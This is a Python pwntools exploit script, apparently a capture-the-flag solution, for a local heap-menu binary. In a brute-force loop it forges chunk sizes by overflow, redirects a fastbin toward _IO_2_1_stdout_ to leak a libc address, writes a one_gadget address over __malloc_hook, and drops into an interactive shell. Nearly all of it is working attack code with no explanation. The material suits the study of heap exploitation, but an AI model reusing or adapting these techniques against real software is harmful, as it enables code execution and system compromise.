from pwn import *
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
elf = ELF("./pwn")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
sh     = lambda      : io.interactive()
menu   = b'choice> '

def add(idx, size):
	sla(menu, b'1')
	sla(b'choice> ', byte(idx))
	sla(b'size> ', byte(size))	

def edit(idx, size, info):
	sla(menu, b'2')
	sla(b'choice> ', byte(idx))
	sla(b'size> ', byte(size))
	sda(b'info> ', info)

def dele(idx):
	sla(menu, b'3')
	sla(b'choice> ', byte(idx))
	
flag = True
while flag:
	try:
		#flag = False
		io = process("./pwn")
		sla(b'name> ', b'XiaozaYa')
		# chunk_size <= 0x68
		add(1, 0x68)
		add(2, 0x68)
		add(3, 0x68)
		dele(2)
		payload = b'\x00'*0x68 + b'\x91'
		edit(1, 0x68, payload)
		payload = b'\x00'*0x10 + p64(0) + p64(0x51) + b'\n'
		edit(3, 0x20, payload)
		dele(2)
		edit(2, 1, b'\xdd\xf5')
		payload = b'\x00'*0x68 + b'\x71'
		edit(1, 0x68, payload)
		#debug()

		add(1, 0x68)
		add(4, 0x68) #  _IO_2_1_stdout_ - 0x33
		#debug()
		payload = b'\x00'*0x33 + p64(0xfbad1800) + p64(0)*3 + b'\x00'
		edit(4, len(payload)-1, payload)
		rc(0x88)
		libc.address = addr(6) - 0x3c48e0
		print("\033[31m[libc_base -> "+str(hex(libc.address))+"]\033[0m")
		malloc_hook = libc.sym.__malloc_hook
		print("\033[32m[malloc_hook -> "+str(hex(malloc_hook))+"]\033[0m")
		dele(1)
		edit(1, 7, p64(malloc_hook-0x23))
		add(1, 0x68)
		add(4, 0x68)
		ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247] 
		ones = [i+libc.address for i in ones]
		payload = b'A'*0x13 + p64(ones[2])
		edit(4, len(payload)-1, payload)
		print("\033[32m=->one_gadget writed<-=\033[0m")
		#debug()
		dele(3)
		add(3, 0x68)
		#dele(3)
		#debug()
		sh()
		#io.close()
		#continue
		break
	except Exception as e:
		io.close()
		continue
